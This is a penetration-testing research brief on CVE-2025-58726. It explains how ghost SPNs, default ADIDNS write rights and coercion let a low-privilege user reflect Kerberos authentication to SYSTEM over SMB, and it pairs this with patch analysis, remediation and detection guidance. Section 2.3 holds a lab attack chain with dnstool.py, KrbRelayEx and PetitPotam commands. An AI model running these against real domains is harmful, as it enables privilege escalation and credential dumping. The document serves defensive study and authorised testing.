# Ghost SPNs & Kerberos Reflection to SYSTEM over SMB — CVE-2025-58726

**Research brief for internal penetration testing** · Compiled 2026-10-27

> **Scope note.** This covers **CVE-2025-58726** (Semperis / Andrea Pierini, Oct 2025): abusing *ghost SPNs* (SPNs whose hostnames do not resolve in DNS) to reflect a coerced Kerberos authentication back to a target's own SMB server and execute as the machine account / SYSTEM. It is the **server-side Kerberos sequel** to **CVE-2025-33073** (Synacktiv, June 2025), the client-side NTLM/Kerberos reflection bug. The two are distinct CVEs with different patches; keep them separate.
>
> **Name-collision warning.** "Ghost SPN" is *also* a Trellix term for a stealthy *Kerberoasting* technique (temporarily adding an SPN to a user account, roasting it, then removing it). That is a **different, unrelated** technique — see §Common Misconceptions #1. This brief is about the Semperis reflection attack unless stated otherwise.

---

## Sourcing & confidence

- **Primary research:** Semperis blog by Andrea Pierini (the disclosing researcher). [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)
- **CVE authority:** MITRE/Microsoft CNA record (CVSS, affected builds, dates). [[mitre]](https://cveawg.mitre.org/api/cve/CVE-2025-58726) · Vendor advisory: [[msrc]](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-58726)
- **Predecessor root-cause analysis:** Synacktiv's CVE-2025-33073 write-up (reflection mechanics + the June 2025 patch). [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- **Tooling:** KrbRelayEx (decoder-it). [[krbrelayex]](https://github.com/decoder-it/KrbRelayEx)

**Flagged as secondary-only / unreliable** (do not rely on without the primary):
- A **CVSS of 9.9** for 58726 (Senserva) is **AI-generated and wrong** — the Microsoft CNA score is **7.5**. [[senserva]](https://senserva.com/cve/CVE-2025-58726.html)
- A **CVSS of 8.8** attached to 58726 (SSOJet) appears to be the **CVE-2025-33073** score leaking across. [[ssojet]](https://ssojet.com/news/kerberos-reflection-exploiting-ghost-spns-for-smb-privilege-elevation)
- A claim that **58726 is in the CISA KEV catalog** (startwithidentity) is **unconfirmed and likely a conflation with 33073**, which *is* in KEV. [[swi-58726]](https://startwithidentity.com/cves/cve-2025-58726.md) See §Preconditions/patch.

**Could not verify from primary:** the exact AP-REQ packet fields in the Semperis write-up (its figures are images), and any in-the-wild exploitation of 58726 specifically (MITRE marks it exploit-maturity *Unproven*).

---

## 1. Key Definitions

| Term | Definition |
|---|---|
| **SPN (Service Principal Name)** | A string identifying a service instance for Kerberos, form `service_class/host[:port][/service_name]`, e.g. `CIFS/fs01.corp.local`. The KDC uses it to locate the account that owns the service and to pick the key that encrypts the service ticket. [[ms-spn]](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) |
| **HOST / CIFS SPN** | Computer accounts auto-register `HOST/<name>` and `HOST/<fqdn>` SPNs; `HOST` is an "umbrella" that covers SMB (`CIFS`), so a client can request `CIFS/<host>` and get a ticket to the machine account. These are the SPNs abused here. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/) |
| **Ghost SPN** *(this attack)* | "SPNs that reference hostnames that are not registered in DNS." Causes: decommissioned hosts whose SPNs were never cleaned, pre-staged SPNs, deployment-script typos, unreachable cross-forest/hybrid hosts, load-balancer names that don't resolve. The hostname being **unresolvable** is what lets an attacker claim it. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/) |
| **Ghost SPN** *(Trellix, unrelated)* | A stealthy **Kerberoasting** method: briefly add an SPN to an ordinary user account (via delegated write rights), request a TGS to crack offline, then remove the SPN to erase the trail. Not reflection, not CVE-2025-58726. [[trellix]](https://www.trellix.com/blogs/research/ghost-spn-attack-kerberoasting-detection-trellix-ndr/) |
| **Authentication reflection** | Capturing a host's authentication and sending it **back to that same host's** service, so the host authenticates to itself. If the client context is SYSTEM, the reflected session runs as SYSTEM. [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) |
| **NTLM relay vs Kerberos relay** | *Relay* forwards an authentication to a **different** service. NTLM relay is the classic (ntlmrelayx). Kerberos was long considered un-relayable because a service ticket is bound to a specific SPN — but if you can make the victim request a ticket for an SPN **you can reach as the victim's own machine**, you can relay/reflect it. [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) |
| **AP-REQ** | The Kerberos application request a client sends to a service, containing the service ticket (encrypted with the **target service account's long-term key**) plus an authenticator. Reflecting the AP-REQ to the account that owns the SPN authenticates *as the caller* to that account. [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) |
| **SMB signing** | Cryptographic signing of SMB packets with the session key. When **required**, a relayed/reflected session fails the integrity check and dies — the single most effective mitigation for every relay/reflection attack. [[ms-smbsigning]](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing) |
| **ADIDNS** | AD-Integrated DNS: zones stored in AD as `dnsNode` objects. The zone's default ACL grants **Authenticated Users** the *Create all child objects* right, so any domain user/computer can add a non-existent record. [[ms-secureupdate]](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc961412(v=technet.10)) [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/) |
| **Authenticated-Users DNS record creation** | Consequence of the above ACL: a standard domain user can register a DNS A record for a name that doesn't yet exist — exactly the primitive needed to "resurrect" a ghost SPN's hostname and point it at the attacker. [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/) |
| **Coercion** | Forcing a machine (often as SYSTEM via LSASS) to authenticate to an attacker-chosen host. Primitives: PetitPotam (`EfsRpc*`), PrinterBug (`MS-RPRN`), DFSCoerce, ShadowCoerce. [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) |
| **Machine account → SYSTEM** | A reflected auth that lands as the computer's own account (`HOST$`) is treated by the local OS as the machine identity, which maps to **NT AUTHORITY\SYSTEM** for local resource access. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/) |

---

## 2. Comprehensive Breakdown

### 2.1 How SPNs map to hostnames, and why they go stale

**What it is.** Every Kerberos-enabled service advertises an SPN on the account that runs it. For a domain-joined Windows machine, the machine account auto-registers `HOST/<shortname>`, `HOST/<fqdn>` (and others) derived from its `dNSHostName`/`sAMAccountName`. A client wanting SMB to `fs01` asks the KDC for `CIFS/fs01` (covered by `HOST`), gets a ticket encrypted with `fs01$`'s key, and presents it.

**How it works.** The SPN is a *label*, resolved in two independent steps:
1. **Kerberos step:** KDC matches the SPN string to an account → issues a ticket. **No DNS is consulted here.**
2. **Network step:** the client resolves the *hostname inside the SPN* via DNS to actually connect.

These two steps can disagree. The SPN can exist on an account while the hostname **no longer resolves**.

**Why they go stale (become "ghost"):**
- Host decommissioned; the computer object or an `additionalDnsHostName`/manually-set SPN lingered.
- SPN pre-staged for a service/host not yet built.
- Typos in deployment/join scripts.
- Cross-forest/hybrid names, or CNAME/load-balancer aliases, that resolve only in some contexts.

**Why it matters to a pentester.** A ghost SPN is a **reflection primitive waiting to be armed.** The Kerberos step still works (ticket issues fine), but the network name is yours to claim — register it in ADIDNS, point it at your relay, and you control where the coerced client connects while the KDC happily issues a ticket for the *real* account that owns the SPN.

**Worked example.** `D1S1$` has `CIFS/GHOST` registered, but `GHOST` has no A record. You (a normal user) add `GHOST → <your-IP>` in ADIDNS. You coerce `D1S1` to authenticate to `\\GHOST\...`. `D1S1` asks the KDC for `CIFS/GHOST` → KDC issues a ticket encrypted with **`D1S1$`'s own key** → `D1S1` sends the AP-REQ to your IP. You now hold a valid AP-REQ that authenticates to `D1S1$`.

### 2.2 Why Kerberos reflection was "thought fixed" — and how ghost SPNs get around CVE-2025-33073

**What it is.** CVE-2025-33073 (Synacktiv, patched **June 2025**) was the first public, reliable reflection-to-SYSTEM over SMB. Microsoft patched it, and many assumed reflection over SMB was closed.

**How CVE-2025-33073 worked (the predecessor).**
1. Coerce SYSTEM (LSASS) via **PetitPotam** to authenticate to an attacker name.
2. The attacker's name carries a **marshalled-target-info marker** appended to a real hostname — a trick first documented by James Forshaw. The DNS record is created with `dnstool.py`:
   ```
   dnstool.py -u 'ASGARD.LOCAL\loki' -p loki 192.168.56.10 \
     -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.56.3
   ```
   Hostname `srv1` + marker `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`.
3. The SMB client passes `cifs/srv11UWh...` to `InitializeSecurityContextW`; `lsasrv!LsapCheckMarshalledTargetInfo` **strips the suffix**, leaving `cifs/srv1`.
4. `msv1_0!SspIsTargetLocalhost` (NTLM) / the Kerberos path then treats `srv1` as **local**, takes the local-auth code path, and the SYSTEM token gets reflected into a server context. `ntlmrelayx.py` dumps SAM. (Kerberos variant: strip NTLM from the advertised mechTypes in `krbrelayx` to force Kerberos; `kerberos!KerbDoesSKeyExist` matches the AP-REQ subkey stored under the SYSTEM LUID and builds a SYSTEM token.) [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)

**What the June 2025 patch changed.** The fix is **client-side**, in `mrxsmb.sys`: `mrxsmb!SmbCeCreateSrvCall` now calls `CredUnmarshalTargetInfo` on the target name and **rejects** (`STATUS_INVALID_PARAMETER`) connections whose target name carries marshalled target info. In other words, Microsoft killed **the marshalled-marker coercion trick**, not reflection itself. [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) (patch-function detail corroborated by Synacktiv's Black Hat Asia 2026 slides [[bhasia]](https://i.blackhat.com/Asia-26/Presentations/BHAS26-Andre-Bypass-Auth-Reflect-Mitigations-REV01.pdf))

**Why ghost SPNs get around it (the key insight).** The 33073 fix assumes reflection needs the *marshalled-marker* hostname. A ghost SPN **needs no marker at all**:
- The SPN hostname is a **genuine name** you simply register in DNS. There is no marshalled target-info suffix, so `CredUnmarshalTargetInfo` finds nothing and the client-side check never fires.
- The KDC still issues a ticket for the real SPN owner, and nothing on the **client** side distinguishes "legit connection to a resurrected host" from "reflection."
- The reflection therefore happens **server-side**: the target's own SMB server accepts an AP-REQ whose SPN maps to *itself*.

So the vulnerability moved from the SMB **client** (33073) to the SMB **server** (58726). The Semperis framing: the 33073 fix "addressed a specific SMB client issue," and the root cause — Kerberos has **no universal reflection-detection mechanism** (unlike NTLM, mitigated for years) — remained. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)

**Why it matters to a pentester.** "Patched in June" does **not** mean a host is safe from reflection. If SMB signing isn't enforced and a ghost SPN exists, a **fully-patched-against-33073** host could still fall to 58726 until the **October 2025** patch is applied. Conversely, after October 2025, enforcing SMB signing remains your belt-and-suspenders regardless of patch level.

### 2.3 The full attack chain, step by step

**What it is.** End-to-end, low-priv domain user → SYSTEM on a target SMB server.

**How it works.**
1. **Enumerate** computer-account SPNs across the domain and find ones whose hostname **does not resolve** (ghost SPNs) — ideally `HOST/`/`CIFS/` on a juicy target that **does not require SMB signing**.
2. **Claim the name:** register the ghost hostname in ADIDNS (Authenticated Users can, by default) pointing at your relay host. [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/)
3. **Stand up the relay:** run **KrbRelayEx** listening on SMB (445), configured with the ghost SPN and the real target as the redirect server. [[krbrelayex]](https://github.com/decoder-it/KrbRelayEx)
4. **Coerce** the target machine to authenticate to the ghost name (PetitPotam / PrinterBug). As SYSTEM/LSASS, it asks the KDC for a ticket to the ghost SPN — issued under the **target's own machine key**.
5. **Reflect:** the target's AP-REQ arrives at your relay; KrbRelayEx forwards it to the target's **own** SMB service. Because the ticket is for an SPN the target account owns, the target accepts it — authenticating the session as **its own machine account → SYSTEM**.
6. **Act as SYSTEM:** interactive SMB console, `-secrets` (dump SAM/LSA), or pivot the forwarded ports (RDP/WinRM/RPC). KrbRelayEx can relay the first auth, then switch to forwarder mode (`r` to restart relay). [[krbrelayex]](https://github.com/decoder-it/KrbRelayEx)

**Why it matters.** No admin creds, no cracking, no CVE-chain beyond this one. Starting point is a **plain domain account**; the output is **SYSTEM on a member server/DC-adjacent host**.

**Worked example (lab).**
```
# 1. find ghost SPN D1S1 has CIFS/GHOST but GHOST does not resolve
# 2. register the name in ADIDNS
dnstool.py -u 'CORP\lowpriv' -p 'Passw0rd!' <DC-IP> -a add -r GHOST -d <ATTACKER-IP>
# 3. start the Kerberos relay (listener on 445, redirect to the real target)
KrbRelayEx.exe -spn CIFS/GHOST -redirectserver <D1S1-IP> -console
# 4. coerce D1S1 to \\GHOST\pipe\...
PetitPotam.py -u lowpriv -p 'Passw0rd!' GHOST <D1S1-IP>
# 5. D1S1 reflects AP-REQ -> relayed to D1S1's own SMB -> SYSTEM console
```
*(dnstool.py from krbrelayx; PetitPotam.py from Impacket-adjacent tooling; KrbRelayEx flags are documented — see §3. Exact invocation varies by environment; the Semperis post demonstrates with its own `TestComputerSpnDNS`/`KrbRelayEx` and `PrinterBug`.)* [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)

### 2.4 Preconditions — all four must hold

**What it is.** 58726 is not a universal "patch-me-now" over every host; it has a **conjunction** of preconditions (which is why Microsoft rates attack complexity **High**).

| Precondition | Detail | How to verify |
|---|---|---|
| **Low-priv domain foothold** | Any authenticated domain account. | You have it. |
| **A ghost SPN on the target** | `HOST/`/`CIFS/` SPN whose hostname doesn't resolve. | SPN enum + DNS resolution check (§3). |
| **DNS write (ADIDNS)** | Ability to register the ghost hostname. Default ACL grants Authenticated Users *Create child objects*. | Check zone ACL; attempt a test record. [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/) |
| **SMB signing NOT required on target** | Signing required = reflected session fails integrity → attack dead. | nxc/CME signing flag; `Get-SmbServerConfiguration` (§3). [[ms-smbsigning]](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing) |
| **A coercion primitive** | PetitPotam/PrinterBug/etc. reachable on the target. | Test the RPC interface. |

**Why it matters.** Missing any one makes it **theoretical**, not exploitable. In particular, **Windows 11 24H2 and Server 2025 require SMB signing by default** (inbound+outbound on 24H2; outbound on Server 2025) — a big swing in the install base toward "not exploitable." Older/upgraded hosts and non-default configs are where you'll find live targets. [[ms-smbsigning]](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing)

### 2.5 Patch status — precise

**What it is.** CVE-2025-58726, "Windows SMB Server Elevation of Privilege Vulnerability," **CWE-284 Improper Access Control.**

- **CVSS 3.1 (Microsoft CNA): 7.5 High** — `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`, with temporal `E:U/RL:O/RC:C` (exploit maturity **Unproven**, official remediation available). [[mitre]](https://cveawg.mitre.org/api/cve/CVE-2025-58726)
- **Timeline:** reported to MSRC **2025-06-25** → confirmed **2025-07-22** → **patched 2025-10-14** (October 2025 Patch Tuesday). CVE reserved 2025-09-03, published 2025-10-14. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/) [[mitre]](https://cveawg.mitre.org/api/cve/CVE-2025-58726)
- **Affected:** all supported Windows / Windows Server (client and server SKUs) below the October 2025 fixed build — Windows 10 1507 through Windows 11 25H2; Server 2008 SP2 through Server 2025. [[mitre]](https://cveawg.mitre.org/api/cve/CVE-2025-58726)

**What the patch changes.** Server-side, in **`srv2.sys`** (the SMB server driver):
- `Smb2ExecuteSessionSetupReal()` modified; new `Smb2ValidateLoopbackAddress()` introduced.
- Logic: if the SPN maps to a **local client security context** *and* the connection is **non-loopback (remote)**, the session is **terminated** (new feature gate `Feature_3857492281`; validation via `SrvAdminValidateSpn_Old`). I.e., the server now refuses a remote connection that authenticates with an SPN belonging to itself — the definition of reflection. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)

**What the patch does NOT fix.** The underlying Kerberos behavior — that Kerberos has no built-in reflection detection — is **unchanged**. Per Semperis, ghost SPNs can still be abused against **other protocols that rely on Kerberos** (HTTP/ADCS, LDAP, etc.); only the SMB-server loopback case is closed. Treat SMB signing and DNS/SPN hygiene as the durable controls, not the patch alone. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)

**Exploitation status.** No confirmed public PoC or in-the-wild use of **58726** specifically (MITRE: Unproven). Contrast the **predecessor CVE-2025-33073**, which **is in CISA KEV** (added **2025-10-20**, federal deadline 2025-11-10), has public PoCs, and is actively exploited (CVSS 8.8). Do not transfer 33073's "actively exploited" status onto 58726. [[cisa-kev]](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) [[guidepoint]](https://www.guidepointsecurity.com/newsroom/cisa-warns-of-windows-smb-flaw-under-active-exploitation-cve-2025-33073/)

---

## 3. Finding and testing it on an engagement

**Goal:** go from "a ghost SPN exists" to "this is exploitable" with evidence, without firing the exploit unless scoped.

### 3.1 Enumerate SPNs and find non-resolving hostnames

- **All SPNs (built-in):**
  ```
  setspn -T <domain> -Q */*
  ```
- **Computer SPNs via LDAP (PowerView):**
  ```powershell
  Get-DomainComputer -LDAPFilter "(servicePrincipalName=*)" |
    Select-Object dnshostname, @{n='spn';e={$_.serviceprincipalname}}
  ```
- **Impacket from Linux (service/user SPNs):**
  ```
  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC> -request   # (user SPNs / Kerberoast)
  ```
  For computer SPNs, pull from LDAP (`ldapsearch`/bloodhound-python) and extract `servicePrincipalName`.
- **Resolve each SPN hostname — the ghost filter:** for every SPN host, test DNS. Any that **fail to resolve** are ghost candidates.
  ```powershell
  # pseudo: for each spnHost: if (-not (Resolve-DnsName $spnHost -ErrorAction SilentlyContinue)) { "GHOST: $spnHost" }
  ```
- **Author's purpose-built auditor:** Andrea Pierini published **`TestComputerSpnDNS`**, which enumerates computer SPNs and flags those whose hostnames don't resolve — i.e., it does exactly this step. Prefer it where available. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)

### 3.2 Check ADIDNS write permission

- **Can you create the record?** Inspect the zone ACL for *Create all child objects* granted to Authenticated Users (default), or test with a throwaway record and delete it:
  ```
  dnstool.py -u 'CORP\you' -p 'pass' <DC-IP> -a add -r test-$RANDOM -d 1.2.3.4
  dnstool.py -u 'CORP\you' -p 'pass' <DC-IP> -a remove -r test-$RANDOM
  ```
- **ACL inspection (PowerView):** `Get-DomainObjectAcl` on the `dnsZone`/`dnsNode` objects, or Powermad's `Get-ADIDNSPermission`. If the ghost name already exists as a stale node you may need to overwrite rather than create. [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/)

### 3.3 Check SMB signing on the target

- **NetExec / CrackMapExec (fastest, at scale):**
  ```
  nxc smb <cidr>                      # column shows signing:True/False
  nxc smb <cidr> --gen-relay-list targets.txt   # writes only signing:False hosts
  ```
- **Nmap:**
  ```
  nmap -p445 --script smb2-security-mode <target>
  # "message signing required" = safe; "enabled but not required" / "disabled" = relayable
  ```
- **On a host you're on (PowerShell):**
  ```powershell
  Get-SmbServerConfiguration | fl RequireSecuritySignature, EnableSecuritySignature
  ```
  `RequireSecuritySignature : True` ⇒ not exploitable via reflection.

### 3.4 Tool matrix

| Step | Tool(s) | Notes |
|---|---|---|
| SPN enum | `setspn`, PowerView `Get-DomainComputer`, `ldapsearch`, BloodHound | Pull `servicePrincipalName` on computer objects. |
| Ghost filter | **TestComputerSpnDNS** (author), or scripted `Resolve-DnsName`/`nslookup` | Non-resolving host = candidate. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/) |
| ADIDNS write | **dnstool.py** (krbrelayx), **Powermad** | Default-open in most domains. [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/) |
| SMB signing | **NetExec/CME**, **nmap smb2-security-mode** | `--gen-relay-list` auto-filters. |
| Coercion | **PetitPotam**, **PrinterBug (dementor/printerbug.py)**, **Coercer** | Must reach the RPC interface on the target. [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) |
| Kerberos relay | **KrbRelayEx** (decoder-it) | `-spn <SPN> -redirectserver <IP> [-console | -secrets | -list]`, `-smbport 445`, `-redirectports 3389,135,5985`. [[krbrelayex]](https://github.com/decoder-it/KrbRelayEx) |

### 3.5 "Exploitable" vs "theoretical"

| | **Exploitable** | **Theoretical / informational** |
|---|---|---|
| Ghost SPN | Present on a reachable host | Present but host unreachable/decommissioned-for-real |
| DNS write | You can add the record | Zone ACL hardened; can't create |
| SMB signing | **Not required** on target | **Required** (or Server 2025/24H2 defaults) |
| Coercion | A primitive reaches the target as SYSTEM | No coercion path; auth never triggered |
| Patch | Target missing Oct-2025 fix | Patched (and signing still off → downgrade to "defense-in-depth" finding) |

Report **Exploitable** only when you have all five (ideally demonstrated to a benign SYSTEM proof such as a whoami via the relay console, within scope). Otherwise document it as a **hardening finding** (stale SPN + permissive ADIDNS + signing off) — still worth raising, since any one change re-arms it.

---

## 4. Remediation and Detection (client-ready)

**Patch (authoritative fix).**
- Apply the **October 2025** cumulative update (CVE-2025-58726) to **all** Windows clients and servers — it adds the server-side loopback check in `srv2.sys`. Also ensure the **June 2025** update (CVE-2025-33073) is present; that one is **actively exploited and in CISA KEV**. [[msrc]](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-58726) [[cisa-kev]](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

**Require SMB signing (kills this and all relay/reflection).**
- Enforce **SMB signing required** on servers and clients via GPO (*Microsoft network server/client: Digitally sign communications (always)*), or `Set-SmbServerConfiguration -RequireSecuritySignature $true`. Windows 11 24H2 / Server 2025 do much of this by default; explicitly enforce on older/upgraded estates. [[ms-smbsigning]](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing)

**Harden ADIDNS / DNS write.**
- Remove **Authenticated Users → Create all child objects** on sensitive AD-integrated zones; delegate dynamic updates to a dedicated DHCP/service account; keep **secure-only** updates. This removes the attacker's ability to resurrect a ghost hostname. [[ms-secureupdate]](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc961412(v=technet.10)) [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/)

**Clean stale SPNs (remove the primitive).**
- Inventory computer-account SPNs; for each, confirm the hostname resolves and the service exists. Remove SPNs for decommissioned/typo/pre-staged hosts (`setspn -D <spn> <account>` or the AD attribute). Make SPN cleanup part of decommissioning. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)

**Reduce coercion surface.**
- Patch/limit PetitPotam (MS-EFSR), PrinterBug (disable Spooler where unneeded), DFSCoerce; apply **RPC filters** to block the coercion interfaces from non-admin sources. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)

**Detection opportunities.**
- **New/temporary SPN writes** on computer (and user) accounts — alert on SPN additions to privileged computer accounts; legitimate SPN changes are rare and script/admin-driven. [[trellix]](https://www.trellix.com/blogs/research/ghost-spn-attack-kerberoasting-detection-trellix-ndr/)
- **New dnsNode creation** by non-infrastructure accounts — Authenticated Users adding A records is a strong signal (Elastic ships a rule for this). [[elastic-dnsnode]](https://www.elastic.co/guide/en/security/current/creation-of-a-dns-named-record.html)
- **Anomalous TGS requests** — service-ticket requests for SPNs the requesting identity never normally uses; unusual ticket lifetimes/etypes. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)
- **Reflected SMB session fingerprint** — a machine account authenticating to **its own** SMB service from a remote address (the exact case the patch now blocks; pre-patch it's a high-fidelity IOC).

---

## 5. Rules & Frameworks (portable heuristics)

1. **"The SPN resolves in Kerberos, not in DNS."** Two independent lookups. Whenever an identifier is authenticated in one namespace but routed in another, the gap is the attack surface. Always test both.
2. **"A patch names a trick, not a class."** 33073 patched the *marshalled-marker* trick; the *reflection class* survived as 58726. When you read a fix, ask *what specific precondition did it remove* and whether another path reaches the same sink.
3. **"Reflection dies to signing."** For every relay/reflection finding, the first exploitability question is SMB signing state. Signing-required → downgrade to defense-in-depth.
4. **"Default-open DNS is a credential-adjacent right."** Authenticated-Users DNS create turns any domain account into a name-claiming primitive. Treat ADIDNS write like a privilege.
5. **"Stale object = live primitive."** Decommissioning that leaves SPNs/DNS/computer objects behind doesn't reduce attack surface; it *creates* ghosts. Hunt the leftovers.
6. **"Coercion is the ignition."** No finding is SYSTEM-level until you can make the target authenticate. Enumerate coercion reachability alongside the vuln.
7. **"Client bug vs server bug changes who you patch."** 33073 = SMB client; 58726 = SMB server. The same host plays both roles — patch and harden both sides.

---

## 6. Common Misconceptions

1. **"Ghost SPN = the Trellix Kerberoasting trick."** *Believed because* both use the phrase "Ghost SPN." *Correction:* Trellix's is **temporarily adding** an SPN to a **user** account to Kerberoast stealthily; Semperis's is a **pre-existing stale** SPN on a **computer** account abused for **reflection to SYSTEM**. Different accounts, different goal (offline cracking vs live SYSTEM), different CVE (Trellix's isn't a Microsoft CVE). [[trellix]](https://www.trellix.com/blogs/research/ghost-spn-attack-kerberoasting-detection-trellix-ndr/) [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)
2. **"The June 2025 (33073) patch stopped Kerberos reflection over SMB."** *Believed because* 33073 was described as *the* SMB reflection fix. *Correction:* it was a **client-side** fix for the marshalled-marker coercion. Ghost SPNs need no marker and reflect **server-side**; you need the **October 2025** patch (58726) to close the SMB-server case — and even that leaves other Kerberos services exposed. [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)
3. **"CVE-2025-58726 is critical / 9.9 / actively exploited."** *Believed because* an AI-generated tracker lists 9.9 and news conflates it with the KEV entry. *Correction:* Microsoft CNA scores it **7.5 High**, exploit maturity **Unproven**; the **actively-exploited, KEV-listed, CVSS-8.8** item is the **predecessor CVE-2025-33073**. Don't merge them. [[mitre]](https://cveawg.mitre.org/api/cve/CVE-2025-58726) [[senserva]](https://senserva.com/cve/CVE-2025-58726.html) [[cisa-kev]](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
4. **"Patching makes you safe regardless of SMB signing."** *Believed because* "patched" feels terminal. *Correction:* the patch only closes the SMB-server loopback case. The durable control is **SMB signing required** + **DNS/SPN hygiene**, which also block the Kerberos-reflection variants the patch doesn't touch. [[semperis]](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)
5. **"Only privileged users can create DNS records."** *Believed because* DNS feels like infra-admin territory. *Correction:* AD-integrated zones grant **Authenticated Users** *Create child objects* by **default** — a standard account can register the ghost hostname. [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/)

---

## 7. Connections & What to Study Next

- **CVE-2025-33073** (Synacktiv) — the client-side reflection parent; read it first to understand the mechanics the patch chased. [[synacktiv-33073]](https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- **Synacktiv, "Bypassing authentication reflection mitigations for SYSTEM shells"** (Black Hat Asia 2026) — where the reflection mitigations keep getting bypassed; the ongoing arms race. [[bhasia]](https://i.blackhat.com/Asia-26/Presentations/BHAS26-Andre-Bypass-Auth-Reflect-Mitigations-REV01.pdf)
- **KerberLoss / CVE-2026-25177** (Semperis) — invisible-Unicode SPN uniqueness bypass; adjacent SPN-abuse class, patched March 2026. [[swi-kerberloss]](https://startwithidentity.com/cves/cve-2026-25177.md)
- **ADIDNS attack surface** (NetSPI, Kevin Robertson; Powermad) — the DNS-write primitive underpinning step 2. [[netspi-adidns]](https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/)
- **Classic Kerberos relay over SMB/HTTP** (dirkjanm krbrelayx; Synacktiv multicast-poisoning pre-auth Kerberos relay) — the toolchain and theory behind reflecting Kerberos. [[synacktiv-mcast]](https://synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)
- **Coercion catalogue** — PetitPotam / PrinterBug / DFSCoerce / Coercer; the ignition for every relay chain.
- **Study next:** apply the ghost-SPN idea to **HTTP/ADCS** relay (ESC8-style) and **LDAP**, which Semperis says remain reachable since the Kerberos root cause is unpatched.

---

## 8. Questions

**Recall.** What makes an SPN a "ghost" SPN in the CVE-2025-58726 sense?
- A) It is assigned to a disabled user account
- B) Its hostname is not registered/resolvable in DNS ✅
- C) It uses RC4 instead of AES encryption
- D) It is duplicated across two accounts

